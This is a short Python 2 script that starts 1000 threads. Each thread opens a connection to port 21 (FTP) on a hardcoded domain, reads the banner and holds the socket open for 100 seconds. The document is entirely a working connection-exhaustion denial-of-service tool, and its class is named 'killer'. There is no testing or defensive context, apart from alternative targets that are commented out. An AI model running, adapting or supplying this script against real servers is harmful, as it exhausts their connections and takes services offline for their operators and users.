#!/usr/bin/env python
import socket, threading, time

#host = 'localhost'
host = 'xiaoxia.org'
#host = 'everet.org'
port = 21

class killer(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        s = socket.socket()
        s.connect((host, port))
        d = s.recv(1024)
        print d
        time.sleep(100)


for i in range(1000):
    killer().start()
